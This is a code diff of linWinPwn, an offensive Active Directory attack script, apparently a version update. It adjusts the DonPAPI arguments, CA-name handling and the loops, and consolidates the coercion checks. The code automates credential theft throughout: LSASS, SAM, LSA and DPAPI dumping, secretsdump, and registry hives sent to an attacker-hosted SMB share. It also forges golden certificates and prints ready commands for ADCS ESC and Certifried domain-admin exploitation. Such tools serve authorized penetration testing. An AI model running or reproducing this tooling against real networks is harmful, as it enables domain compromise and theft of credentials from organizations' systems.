@@ -135,7 +135,7 @@ print_banner() {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.0.17 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.0.18 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -472,7 +472,7 @@ authenticate() {
         argument_ldeep="-d ${domain} -u ${user} -p '${password}'"
         argument_pre2k="-d ${domain} -u ${user} -p '${password}'"
         argument_certsync="-d ${domain} -u ${user} -p '${password}'"
-        argument_donpapi="${domain}/${user}:'${password}'"
+        argument_donpapi="-d ${domain} -u ${user} -p '${password}'"
         argument_hekatomb="${domain}/${user}:'${password}'"
         argument_silenthd="-u ${domain}\\\\${user} -p '${password}'"
         argument_windap="-d ${domain} -u ${user} -p '${password}'"
@@ -538,7 +538,7 @@ authenticate() {
                 argument_certipy="-u ${user}\\@${domain} -hashes ${hash}"
                 argument_pre2k="-d ${domain} -u ${user} -hashes ${hash}"
                 argument_certsync="-d ${domain} -u ${user} -hashes ${hash}"
-                argument_donpapi=" -H ${hash} ${domain}/${user}"
+                argument_donpapi="-H ${hash} -d ${domain} -u ${user}"
                 argument_hekatomb="-hashes ${hash} ${domain}/${user}"
                 argument_silenthd="-u ${domain}\\\\${user} --hashes ${hash}"
                 argument_windap="-d ${domain} -u ${user} --hash ${hash}"
@@ -594,7 +594,7 @@ authenticate() {
             argument_ldeep="-d ${domain} -u ${user} -k"
             argument_pre2k="-d ${domain} -u ${user} -k -no-pass"
             argument_certsync="-d ${domain} -u ${user} -use-kcache -no-pass -k"
-            argument_donpapi="-k -no-pass ${domain}/${user}"
+            argument_donpapi="-k --no-pass -d ${domain} -u ${user}"
             argument_targkerb="-d ${domain} -u ${user} -k --no-pass"
             argument_p0dalirius="-d ${domain} -u ${user} -k --no-pass"
             argument_FindUncom="-ad ${domain} -au ${user} -k --no-pass"
@@ -624,7 +624,7 @@ authenticate() {
         argument_certipy="-u ${user}\\@${domain} -aes ${aeskey} -target ${dc_FQDN}"
         argument_pre2k="-d ${domain} -u ${user} -aes ${aeskey} -k"
         argument_certsync="-d ${domain} -u ${user} -aesKey ${aeskey} -k"
-        argument_donpapi="-k -aesKey ${aeskey} ${domain}/${user}"
+        argument_donpapi="-k --aesKey ${aeskey} -d ${domain} -u ${user}"
         argument_targkerb="-d ${domain} -u ${user} --aes-key ${aeskey} -k"
         argument_p0dalirius="-d ${domain} -u ${user} --aes-key ${aeskey} -k"
         argument_FindUncom="-ad ${domain} -au ${user} --aes-key ${aeskey} -k"
@@ -711,7 +711,6 @@ authenticate() {
         argument_adidns="${argument_adidns} -v -d"
         argument_pre2k="${argument_pre2k} -verbose"
         argument_certsync="${argument_certsync} -debug"
-        argument_donpapi="-d ${argument_donpapi}"
         argument_hekatomb="-debug ${argument_hekatomb}"
         argument_windap="${argument_windap} -v --debug"
         argument_targkerb="${argument_targkerb} -v"
@@ -1519,7 +1518,7 @@ ne_adcs_enum() {
         echo -e "${YELLOW}[i] ADCS info found, skipping...${NC}"
     fi
     pki_servers=$(grep "Found PKI Enrollment Server" "${output_dir}/ADCS/ne_adcs_output_${dc_domain}.txt" | cut -d ":" -f 4 | cut -d " " -f 2 | awk '!x[$0]++')
-    pki_cas=$(grep "Found CN" "${output_dir}/ADCS/ne_adcs_output_${dc_domain}.txt" | cut -d ":" -f 4 | cut -d " " -f 2 | awk '!x[$0]++')
+    pki_cas=$(grep "Found CN" "${output_dir}/ADCS/ne_adcs_output_${dc_domain}.txt" | cut -d ":" -f 4 | cut -d " " -f 2- | sed "s/ /SPACE/g" | awk '!x[$0]++')
 }
 
 certi_py_enum() {
@@ -1570,7 +1569,7 @@ adcs_vuln_parse() {
         for vulntemp in $esc1_vuln; do
             echo -e "${YELLOW}# ${vulntemp} certificate template${NC}"
             echo -e "${CYAN}1. Request certificate with an arbitrary UPN (domain_admin or DC or both):${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca < ${pki_cas} > -target < ${pki_servers} > -template ${vulntemp} -upn domain_admin@${dc_domain} -dns ${dc_FQDN} -dc-ip ${dc_ip} -key-size 4096"
+            echo -e "${certipy} req ${argument_certipy} -ca < ${pki_cas//SPACE/ } > -target < ${pki_servers} > -template ${vulntemp} -upn domain_admin@${dc_domain} -dns ${dc_FQDN} -dc-ip ${dc_ip} -key-size 4096"
             echo -e "${CYAN}2. Authenticate using pfx of domain_admin or DC:${NC}"
             echo -e "${certipy} auth -pfx domain_admin_dc.pfx -dc-ip ${dc_ip}"
         done
@@ -1582,9 +1581,9 @@ adcs_vuln_parse() {
         for vulntemp in $esc2_3_vuln; do
             echo -e "${YELLOW}# ${vulntemp} certificate template${NC}"
             echo -e "${CYAN}1. Request a certificate based on the vulnerable template:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca < ${pki_cas} > -target < ${pki_servers} > -template ${vulntemp} -dc-ip ${dc_ip}"
+            echo -e "${certipy} req ${argument_certipy} -ca < ${pki_cas//SPACE/ } > -target < ${pki_servers} > -template ${vulntemp} -dc-ip ${dc_ip}"
             echo -e "${CYAN}2. Use the Certificate Request Agent certificate to request a certificate on behalf of the domain_admin:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca < ${pki_cas} > -target < ${pki_servers} > -template User -on-behalf-of $(echo "$dc_domain" | cut -d "." -f 1)\\domain_admin -pfx ${user}.pfx -dc-ip ${dc_ip}"
+            echo -e "${certipy} req ${argument_certipy} -ca < ${pki_cas//SPACE/ } > -target < ${pki_servers} > -template User -on-behalf-of $(echo "$dc_domain" | cut -d "." -f 1)\\domain_admin -pfx ${user}.pfx -dc-ip ${dc_ip}"
             echo -e "${CYAN}3. Authenticate using pfx of domain_admin:${NC}"
             echo -e "${certipy} auth -pfx domain_admin.pfx -dc-ip ${dc_ip}"
         done
@@ -1598,7 +1597,7 @@ adcs_vuln_parse() {
             echo -e "${CYAN}1. Make the template vulnerable to ESC1:${NC}"
             echo -e "${certipy} template ${argument_certipy} -template ${vulntemp} -save-old -dc-ip ${dc_ip}"
             echo -e "${CYAN}2. Request certificate with an arbitrary UPN (domain_admin or DC or both):${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca < ${pki_cas} > -target < ${pki_servers} > -template ${vulntemp} -upn domain_admin@${dc_domain} -dns ${dc_FQDN} -dc-ip ${dc_ip}"
+            echo -e "${certipy} req ${argument_certipy} -ca < ${pki_cas//SPACE/ } > -target < ${pki_servers} > -template ${vulntemp} -upn domain_admin@${dc_domain} -dns ${dc_FQDN} -dc-ip ${dc_ip}"
             echo -e "${CYAN}3. Restore configuration of vulnerable template:${NC}"
             echo -e "${certipy} template ${argument_certipy} -template ${vulntemp} -configuration ${vulntemp}.json"
             echo -e "${CYAN}4. Authenticate using pfx of domain_admin or DC:${NC}"
@@ -1660,7 +1659,7 @@ adcs_vuln_parse() {
             echo -e "${CYAN}2. Change userPrincipalName of second_user to domain_admin:${NC}"
             echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn domain_admin@${dc_domain} -dc-ip ${dc_ip}"
             echo -e "${CYAN}3. Request vulnerable certificate as second_user:${NC}"
-            echo -e "${certipy} req -username <second_user>@${dc_domain} -hash <second_user_hash> -target < ${pki_servers} > -ca < ${pki_cas} > -template ${vulntemp} -dc-ip ${dc_ip}"
+            echo -e "${certipy} req -username <second_user>@${dc_domain} -hash <second_user_hash> -target < ${pki_servers} > -ca < ${pki_cas//SPACE/ } > -template ${vulntemp} -dc-ip ${dc_ip}"
             echo -e "${CYAN}4. Change second_user's UPN back:${NC}"
             echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn <second_user>@${dc_domain} -dc-ip ${dc_ip}"
             echo -e "${CYAN}5. Authenticate using pfx of domain_admin:${NC}"
@@ -1718,13 +1717,13 @@ certifried_check() {
             for pki_server in $pki_servers; do
                 i=$((i + 1))
                 pki_ca=$(echo -e "$pki_cas" | sed 's/ /\n/g' | sed -n ${i}p)
-                run_command "${certipy} req ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp -target ${pki_server} -ca ${pki_ca} -template User" 2>&1 | tee "${output_dir}/Vulnerabilities/certifried_check_${pki_server}_${dc_domain}.txt"
+                run_command "${certipy} req ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp -target ${pki_server} -ca \"${pki_ca//SPACE/ }\" -template User" 2>&1 | tee "${output_dir}/Vulnerabilities/certifried_check_${pki_server}_${dc_domain}.txt"
                 if ! grep -q "Certificate object SID is" "${output_dir}/Vulnerabilities/certifried_check_${pki_server}_${dc_domain}.txt" && ! grep -q "error" "${output_dir}/Vulnerabilities/certifried_check_${pki_server}_${dc_domain}.txt"; then
                     echo -e "${GREEN}[+] ${pki_server} potentially vulnerable to Certifried! Follow steps below for exploitation:${NC}" | tee -a "${output_dir}/Exploitation/Certifried_exploitation_steps_${dc_domain}.txt"
                     echo -e "${CYAN}1. Create a new computer account with a dNSHostName property of a Domain Controller:${NC}" | tee -a "${output_dir}/Exploitation/Certifried_exploitation_steps_${dc_domain}.txt"
                     echo -e "${certipy} account create ${argument_certipy} -user NEW_COMPUTER_NAME -pass NEW_COMPUTER_PASS -dc-ip $dc_ip -dns $dc_NETBIOS.$dc_domain" | tee -a "${output_dir}/Exploitation/Certifried_exploitation_steps_${dc_domain}.txt"
                     echo -e "${CYAN}2. Obtain a certificate for the new computer:${NC}" | tee -a "${output_dir}/Exploitation/Certifried_exploitation_steps_${dc_domain}.txt"
-                    echo -e "${certipy} req -u NEW_COMPUTER_NAME\$@${dc_domain} -p NEW_COMPUTER_PASS -dc-ip $dc_ip -target $pki_server -ca ${pki_ca} -template Machine" | tee -a "${output_dir}/Exploitation/Certifried_exploitation_steps_${dc_domain}.txt"
+                    echo -e "${certipy} req -u NEW_COMPUTER_NAME\$@${dc_domain} -p NEW_COMPUTER_PASS -dc-ip $dc_ip -target $pki_server -ca \"${pki_ca//SPACE/ }\" -template Machine" | tee -a "${output_dir}/Exploitation/Certifried_exploitation_steps_${dc_domain}.txt"
                     echo -e "${CYAN}3. Authenticate using pfx:${NC}" | tee -a "${output_dir}/Exploitation/Certifried_exploitation_steps_${dc_domain}.txt"
                     echo -e "${certipy} auth -pfx ${dc_NETBIOS}.pfx -username ${dc_NETBIOS}\$ -dc-ip ${dc_ip}" | tee -a "${output_dir}/Exploitation/Certifried_exploitation_steps_${dc_domain}.txt"
                     echo -e "${CYAN}4. Delete the created computer:${NC}" | tee -a "${output_dir}/Exploitation/Certifried_exploitation_steps_${dc_domain}.txt"
@@ -1770,11 +1769,11 @@ certipy_ca_dump() {
                 i=$((i + 1))
                 pki_ca=$(echo -e "$pki_cas" | sed 's/ /\n/g' | sed -n ${i}p)
                 run_command "${certipy} ca ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp -target ${pki_server} -backup" | tee -a "${output_dir}/ADCS/certipy_ca_backup_output_${dc_domain}.txt"
-                run_command "${certipy} forge -ca-pfx ${output_dir}/Credentials/${pki_ca}.pfx -upn Administrator@${dc_domain} -subject CN=Administrator,CN=Users,$domain_DN -out Administrator_${pki_ca}_${dc_domain}.pfx" | tee -a "${output_dir}/ADCS/certipy_forge_output_${dc_domain}.txt"
-                if [[ -f "${output_dir}/Credentials/Administrator_${pki_ca}_${dc_domain}.pfx" ]]; then
+                run_command "${certipy} forge -ca-pfx ${output_dir}/Credentials/${pki_ca//SPACE/_}.pfx -upn Administrator@${dc_domain} -subject CN=Administrator,CN=Users,$domain_DN -out Administrator_${pki_ca//SPACE/_}_${dc_domain}.pfx" | tee -a "${output_dir}/ADCS/certipy_forge_output_${dc_domain}.txt"
+                if [[ -f "${output_dir}/Credentials/Administrator_${pki_ca//SPACE/_}_${dc_domain}.pfx" ]]; then
                     echo -e "${GREEN}[+] Golden Certificate successfully generated!${NC}"
                     echo -e "${CYAN}Authenticate using pfx of Administrator:${NC}"
-                    echo -e "${certipy} auth -pfx ${output_dir}/Credentials/Administrator_${pki_ca}_${dc_domain}.pfx -dc-ip ${dc_ip} [-ldap-shell]"
+                    echo -e "${certipy} auth -pfx ${output_dir}/Credentials/Administrator_${pki_ca//SPACE/_}_${dc_domain}.pfx -dc-ip ${dc_ip} [-ldap-shell]"
                 fi
             done
             cd "${current_dir}" || exit
@@ -1799,10 +1798,10 @@ masky_dump() {
             for pki_server in $pki_servers; do
                 i=$((i + 1))
                 pki_ca=$(echo -e "$pki_cas" | sed 's/ /\n/g' | sed -n ${i}p)
-                while IFS= read -r i; do
+                for i in $(/bin/cat "${servers_smb_list}"); do
                     echo -e "${CYAN}[*] LSASS dump of ${i} using masky (PKINIT)${NC}"
-                    run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M masky -o CA=${pki_server}\\${pki_ca} --log ${output_dir}/Credentials/lsass_dump_masky_${dc_domain}_${i}.txt" 2>&1
-                done <"${servers_smb_list}"
+                    run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M masky -o \"CA=${pki_server}\\${pki_ca//SPACE/ }\" --log ${output_dir}/Credentials/lsass_dump_masky_${dc_domain}_${i}.txt" 2>&1
+                done
             done
         else
             echo -e "${PURPLE}[-] No ADCS servers found! Please re-run ADCS enumeration and try again..${NC}"
@@ -2183,7 +2182,7 @@ smb_map() {
         else
             smb_scan
             echo -e "${BLUE}[*] Listing accessible SMB shares - Step 1/2${NC}"
-            grep -v ':' <"${servers_smb_list}" | while IFS= read -r i; do
+            for i in $(grep -v ':' "${servers_smb_list}"); do
                 echo -e "${CYAN}[*] Listing shares on ${i} ${NC}"
                 run_command "${smbmap} -H $i ${argument_smbmap}" | grep -v "Working on it..." >"${output_dir}/Shares/smbmapDump/smb_shares_${dc_domain}_${i}.txt"
                 if [ "${nullsess_bool}" == true ]; then
@@ -2197,7 +2196,7 @@ smb_map() {
             grep -iaH READ "${output_dir}/Shares/smbmapDump/smb_shares_${dc_domain}_*.txt" 2>&1 | grep -v 'prnproc\$\|IPC\$\|print\$\|SYSVOL\|NETLOGON' | sed "s/\t/ /g; s/   */ /g; s/READ ONLY/READ-ONLY/g; s/READ, WRITE/READ-WRITE/g; s/smb_shares_//; s/.txt://g; s/${dc_domain}_//g" | rev | cut -d "/" -f 1 | rev | awk -F " " '{print "\\\\" $1 "\\" $2}' >"${output_dir}/Shares/all_network_shares_${dc_domain}.txt"
 
             echo -e "${BLUE}[*] Listing files in accessible shares - Step 2/2${NC}"
-            grep -v ':' <"${servers_smb_list}" | while IFS= read -r i; do
+            for i in $(grep -v ':' "${servers_smb_list}"); do
                 echo -e "${CYAN}[*] Listing files in accessible shares on ${i} ${NC}"
                 if [ "${kerb_bool}" == true ]; then
                     echo -e "${PURPLE}[-] smbmap does not support kerberos tickets${NC}"
@@ -2358,15 +2357,14 @@ ms17-010_check() {
     echo -e ""
 }
 
-petitpotam_check() {
-    echo -e "${BLUE}[*] PetitPotam check ${NC}"
-    run_command "${netexec} ${ne_verbose} smb ${target_dc} ${argument_ne} -M petitpotam --log ${output_dir}/Vulnerabilities/ne_petitpotam_output_${dc_domain}.txt" 2>&1
-    echo -e ""
-}
-
-dfscoerce_check() {
-    echo -e "${BLUE}[*] dfscoerce check ${NC}"
-    run_command "${netexec} ${ne_verbose} smb ${target_dc} ${argument_ne} -M dfscoerce --log ${output_dir}/Vulnerabilities/ne_dfscoerce_output_${dc_domain}.txt" 2>&1
+coerceplus_check() {
+    echo -e "${BLUE}[*] coerce check ${NC}"
+    if [ "${kerb_bool}" == true ]; then
+        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
+        curr_targets="Domain Controllers"
+    fi
+    smb_scan
+    run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M coerce_plus --log ${output_dir}/Vulnerabilities/ne_coerce_output_${dc_domain}.txt" 2>&1
     echo -e ""
 }
 
@@ -2403,16 +2401,7 @@ webdav_check() {
     echo -e ""
 }
 
-shadowcoerce_check() {
-    echo -e "${BLUE}[*] shadowcoerce check ${NC}"
-    if [ "${kerb_bool}" == true ]; then
-        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
-        curr_targets="Domain Controllers"
-    fi
-    smb_scan
-    run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M shadowcoerce --log ${output_dir}/Vulnerabilities/ne_shadowcoerce_output_${dc_domain}.txt" 2>&1
-    echo -e ""
-}
+
 
 smbsigning_check() {
     echo -e "${BLUE}[*] Listing servers with SMB signing disabled or not required ${NC}"
@@ -2459,8 +2448,7 @@ rpcdump_check() {
         mkdir -p "${output_dir}/Vulnerabilities/RPCDump"
         echo -e "${BLUE}[*] Impacket rpcdump${NC}"
         smb_scan
-        while IFS= read -r i; do
-            # Your loop body here
+        for i in $(/bin/cat "${servers_smb_list}"); do
             echo -e "${CYAN}[*] RPC Dump of ${i} ${NC}"
             run_command "${impacket_rpcdump} ${argument_imp}\\@$i" >"${output_dir}/Vulnerabilities/RPCDump/impacket_rpcdump_output_${i}.txt"
             inte_prot="MS-RPRN MS-PAR MS-EFSR MS-FSRVP MS-DFSNM MS-EVEN"
@@ -2470,7 +2458,7 @@ rpcdump_check() {
                     echo -e "${GREEN}[+] $prot_grep found at ${i}${NC}"
                 fi
             done
-        done <"${servers_smb_list}"
+        done
         echo -e ""
     fi
     echo -e ""
@@ -2549,9 +2537,9 @@ mssql_enum() {
     else
         echo -e "${BLUE}[*] MSSQL Enumeration${NC}"
         sed -e 's/ //' -e 's/\$//' -e 's/.*/\U&/' "${output_dir}"/DomainRecon/Servers/sql_list_*_"${dc_domain}.txt" | sort -uf >"${sql_hostname_list}" 2>&1
-        while IFS= read -r i; do
+        for i in $(/bin/cat "${sql_hostname_list}"); do
             grep -i "$(echo "$i" | cut -d "." -f 1)" "${output_dir}/DomainRecon/dns_records_${dc_domain}.csv" 2>/dev/null | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 | sort -u >"${sql_ip_list}"
-        done <"${sql_hostname_list}"
+        done
         if [ -f "${target_sql}" ]; then
             run_command "${netexec} ${ne_verbose} mssql ${target_sql} ${argument_ne} -M mssql_priv --log ${output_dir}/DomainRecon/ne_mssql_priv_output_${dc_domain}.txt" 2>&1
         else
@@ -2943,7 +2931,7 @@ juicycreds_dump() {
         curr_targets="Domain Controllers"
     fi
     smb_scan
-    while IFS= read -r i; do
+    for i in $(/bin/cat "${servers_smb_list}"); do
         echo -e "${CYAN}[*] Searching in ${i} ${NC}"
         run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M firefox --log ${output_dir}/Credentials/firefox_${dc_domain}_${i}.txt" 2>&1
         run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M keepass_discover --log ${output_dir}/Credentials/keepass_discover_${dc_domain}_${i}.txt" 2>&1
@@ -2994,7 +2982,7 @@ secrets_dump() {
             echo -e "${PURPLE}[-] secretsdump requires credentials${NC}"
         else
             smb_scan
-            while IFS= read -r i; do
+            for i in $(/bin/cat "${servers_smb_list}"); do
                 echo -e "${CYAN}[*] secretsdump of ${i} ${NC}"
                 run_command "${impacket_secretsdump} ${argument_imp}\\@${i} -dc-ip ${dc_ip}" | tee "${output_dir}/Credentials/secretsdump_${dc_domain}_${i}.txt"
             done
@@ -3016,7 +3004,7 @@ samsystem_dump() {
             echo -e "${YELLOW}[*] Run an SMB server using the following command and then press ENTER to continue....${NC}"
             echo -e "${impacket_smbserver} -ip $attacker_IP -smb2support lwpshare ${output_dir}/Credentials/"
             read -rp "" </dev/tty
-            while IFS= read -r i; do
+            for i in $(/bin/cat "${servers_smb_list}"); do
                 echo -e "${CYAN}[*] reg save of ${i} ${NC}"
                 mkdir -p "${output_dir}/Credentials/SAMDump/${i}"
                 run_command "${impacket_reg} ${argument_imp}\\@${i} -dc-ip ${dc_ip} backup -o \\\\$attacker_IP\\lwpshare\\SAMDump\\$i" | tee "${output_dir}/Credentials/SAMDump/regsave_${dc_domain}_${i}.txt"
@@ -3047,10 +3035,10 @@ sam_dump() {
             curr_targets="Domain Controllers"
         fi
         smb_scan
-        while IFS= read -r i; do
+        for i in $(/bin/cat "${servers_smb_list}"); do
             echo -e "${CYAN}[*] SAM dump of ${i} ${NC}"
             run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} --sam --log ${output_dir}/Credentials/sam_dump_${dc_domain}_${i}.txt" 2>&1
-        done <"${servers_smb_list}"
+        done
     fi
     echo -e ""
 }
@@ -3065,10 +3053,10 @@ lsa_dump() {
             curr_targets="Domain Controllers"
         fi
         smb_scan
-        while IFS= read -r i; do
+        for i in $(/bin/cat "${servers_smb_list}"); do
             echo -e "${CYAN}[*] LSA dump of ${i} ${NC}"
             run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} --lsa --log ${output_dir}/Credentials/lsa_dump_${dc_domain}_${i}.txt" 2>&1
-        done <"${servers_smb_list}"
+        done
     fi
     echo -e ""
 }
@@ -3083,10 +3071,10 @@ lsassy_dump() {
             curr_targets="Domain Controllers"
         fi
         smb_scan
-        while IFS= read -r i; do
+        for i in $(/bin/cat "${servers_smb_list}"); do
             echo -e "${CYAN}[*] LSASS dump of ${i} using lsassy${NC}"
             run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M lsassy --log ${output_dir}/Credentials/lsass_dump_lsassy_${dc_domain}_${i}.txt" 2>&1
-        done <"${servers_smb_list}"
+        done
     fi
     echo -e ""
 }
@@ -3101,10 +3089,10 @@ handlekatz_dump() {
             curr_targets="Domain Controllers"
         fi
         smb_scan
-        while IFS= read -r i; do
+        for i in $(/bin/cat "${servers_smb_list}"); do
             echo -e "${CYAN}[*] LSASS dump of ${i} using handlekatz${NC}"
             run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M handlekatz --log ${output_dir}/Credentials/lsass_dump_handlekatz_${dc_domain}_${i}.txt" 2>&1
-        done <"${servers_smb_list}"
+        done
     fi
     echo -e ""
 }
@@ -3119,10 +3107,10 @@ procdump_dump() {
             curr_targets="Domain Controllers"
         fi
         smb_scan
-        while IFS= read -r i; do
+        for i in $(/bin/cat "${servers_smb_list}"); do
             echo -e "${CYAN}[*] LSASS dump of ${i} using procdump ${NC}"
             run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M procdump --log ${output_dir}/Credentials/lsass_dump_procdump_${dc_domain}_${i}.txt" 2>&1
-        done <"${servers_smb_list}"
+        done
     fi
     echo -e ""
 }
@@ -3137,10 +3125,10 @@ nanodump_dump() {
             curr_targets="Domain Controllers"
         fi
         smb_scan
-        while IFS= read -r i; do
+        for i in $(/bin/cat "${servers_smb_list}"); do
             echo -e "${CYAN}[*] LSASS dump of ${i} using nanodump ${NC}"
             run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M nanodump --log ${output_dir}/Credentials/lsass_dump_nanodump_${dc_domain}_${i}.txt" 2>&1
-        done <"${servers_smb_list}"
+        done
     fi
     echo -e ""
 }
@@ -3155,11 +3143,11 @@ dpapi_dump() {
             curr_targets="Domain Controllers"
         fi
         smb_scan
-        while IFS= read -r i; do
+        for i in $(/bin/cat "${servers_smb_list}"); do
             echo -e "${CYAN}[*] DPAPI dump of ${i} using netexec ${NC}"
             run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} --dpapi cookies --log ${output_dir}/Credentials/dpapi_dump_${dc_domain}_${i}.txt" 2>&1
             run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} --dpapi nosystem --log ${output_dir}/Credentials/dpapi_dump_${dc_domain}_${i}.txt" 2>&1
-        done <"${servers_smb_list}"
+        done
     fi
     echo -e ""
 }
@@ -3169,17 +3157,15 @@ donpapi_dump() {
         echo -e "${RED}[-] DonPAPI.py not found! Please verify the installation of DonPAPI${NC}"
     else
         echo -e "${BLUE}[*] Dumping secrets using DonPAPI${NC}"
+        mkdir -p "${output_dir}/Credentials/DonPAPI/recover"
         if [ "${nullsess_bool}" == true ]; then
             echo -e "${PURPLE}[-] DonPAPI requires credentials${NC}"
         else
             smb_scan
-            current_dir=$(pwd)
-            cd "${output_dir}/Credentials" || exit
-            while IFS= read -r i; do
+            for i in $(/bin/cat "${servers_smb_list}"); do
                 echo -e "${CYAN}[*] DonPAPI dump of ${i} ${NC}"
-                run_command "${donpapi} ${argument_donpapi}\\@${i} -dc-ip ${dc_ip}" | tee "${output_dir}/Credentials/DonPAPI_${dc_domain}_${i}.txt"
-            done <"${servers_smb_list}"
-            cd "${current_dir}" || exit
+                run_command "${donpapi} -o ${output_dir}/Credentials/DonPAPI collect ${argument_donpapi} -t ${i} --dc-ip ${dc_ip}" | tee "${output_dir}/Credentials/DonPAPI/DonPAPI_${dc_domain}_${i}.txt"
+            done
         fi
     fi
     echo -e ""
@@ -3411,12 +3397,10 @@ scan_shares() {
 vuln_checks() {
     zerologon_check
     ms17-010_check
-    petitpotam_check
-    dfscoerce_check
     spooler_check
     printnightmare_check
     webdav_check
-    shadowcoerce_check
+    coerceplus_check
     smbsigning_check
     ntlmv1_check
     runasppl_check
@@ -4440,19 +4424,17 @@ vulns_menu() {
     echo -e "m) Modify target(s)"
     echo -e "1) zerologon check using netexec (only on DC)"
     echo -e "2) MS17-010 check using netexec"
-    echo -e "3) PetitPotam check using netexec (only on DC)"
-    echo -e "4) dfscoerce check using netexec (only on DC)"
-    echo -e "5) Print Spooler check using netexec"
-    echo -e "6) Printnightmare check using netexec"
-    echo -e "7) WebDAV check using netexec"
-    echo -e "8) shadowcoerce check using netexec"
-    echo -e "9) SMB signing check using netexec"
-    echo -e "10) ntlmv1 check using netexec"
-    echo -e "11) runasppl check using netexec"
-    echo -e "12) RPC Dump and check for interesting protocols"
-    echo -e "13) Coercer RPC scan"
-    echo -e "14) PushSubscription abuse using PrivExchange"
-    echo -e "15) RunFinger scan"
+    echo -e "3) Print Spooler check using netexec"
+    echo -e "4) Printnightmare check using netexec"
+    echo -e "5) WebDAV check using netexec"
+    echo -e "6) coerce check using netexec"
+    echo -e "7) SMB signing check using netexec"
+    echo -e "8) ntlmv1 check using netexec"
+    echo -e "9) runasppl check using netexec"
+    echo -e "10) RPC Dump and check for interesting protocols"
+    echo -e "11) Coercer RPC scan"
+    echo -e "12) PushSubscription abuse using PrivExchange"
+    echo -e "13) RunFinger scan"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -4480,66 +4462,56 @@ vulns_menu() {
         ;;
 
     3)
-        petitpotam_check
-        vulns_menu
-        ;;
-
-    4)
-        dfscoerce_check
-        vulns_menu
-        ;;
-
-    5)
         spooler_check
         vulns_menu
         ;;
 
-    6)
+    4)
         printnightmare_check
         vulns_menu
         ;;
 
-    7)
+    5)
         webdav_check
         vulns_menu
         ;;
 
-    8)
-        shadowcoerce_check
+    6)
+        coerceplus_check
         vulns_menu
         ;;
 
-    9)
+    7)
         smbsigning_check
         vulns_menu
         ;;
 
-    10)
+    8)
         ntlmv1_check
         vulns_menu
         ;;
 
-    11)
+    9)
         runasppl_check
         vulns_menu
         ;;
 
-    12)
+    10)
         rpcdump_check
         vulns_menu
         ;;
 
-    13)
+    11)
         coercer_check
         vulns_menu
         ;;
 
-    14)
+    12)
         privexchange_check
         vulns_menu
         ;;
 
-    15)
+    13)
         runfinger_check
         vulns_menu
         ;;
@@ -5079,7 +5051,7 @@ auth_menu() {
                 for pki_server in $pki_servers; do
                     i=$((i + 1))
                     pki_ca=$(echo -e "$pki_cas" | sed 's/ /\n/g' | sed -n ${i}p)
-                    run_command "${certipy} req ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp -target ${pki_server} -ca ${pki_ca} -template User" | tee "${output_dir}/Credentials/certipy_reqcert_output_${dc_domain}.txt"
+                    run_command "${certipy} req ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp -target ${pki_server} -ca \"${pki_ca//SPACE/ }\" -template User" | tee "${output_dir}/Credentials/certipy_reqcert_output_${dc_domain}.txt"
                 done
                 cd "${current_dir}" || exit
                 if [ -f "${output_dir}/Credentials/${user}.pfx" ]; then
